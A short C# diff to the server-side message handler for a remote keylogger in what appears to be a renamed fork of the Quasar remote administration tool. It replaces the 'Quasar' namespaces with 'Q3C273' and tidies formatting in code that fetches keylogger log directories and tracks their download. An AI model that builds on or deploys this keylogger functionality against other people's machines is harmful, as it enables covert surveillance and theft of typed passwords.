@@ -1,13 +1,13 @@
-﻿using Quasar.Common.Helpers;
-using Quasar.Common.Messages;
-using Quasar.Common.Models;
-using Quasar.Common.Networking;
-using Quasar.Server.Models;
-using Quasar.Server.Networking;
+﻿using Q3C273.Server.Models;
+using Q3C273.Server.Networking;
+using Q3C273.Shared.Helpers;
+using Q3C273.Shared.Messages;
+using Q3C273.Shared.Models;
+using Q3C273.Shared.Networking;
 using System;
 using System.IO;
 
-namespace Quasar.Server.Messages
+namespace Q3C273.Server.Messages
 {
     /// <summary>
     /// Handles messages for the interaction with the remote keylogger.
@@ -81,12 +81,12 @@ namespace Quasar.Server.Messages
         private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
         {
             _remoteKeyloggerDirectory = message.LogsDirectory;
-            client.Send(new GetDirectory {RemotePath = _remoteKeyloggerDirectory});
+            client.Send(new GetDirectory { RemotePath = _remoteKeyloggerDirectory });
         }
 
         private string GetDownloadProgress(int allTransfers, int completedTransfers)
         {
-            decimal progress = Math.Round((decimal)((double)completedTransfers / (double)allTransfers * 100.0), 2);
+            var progress = Math.Round((decimal)(completedTransfers / (double)allTransfers * 100.0), 2);
             return $"Downloading...({progress}%)";
         }
 
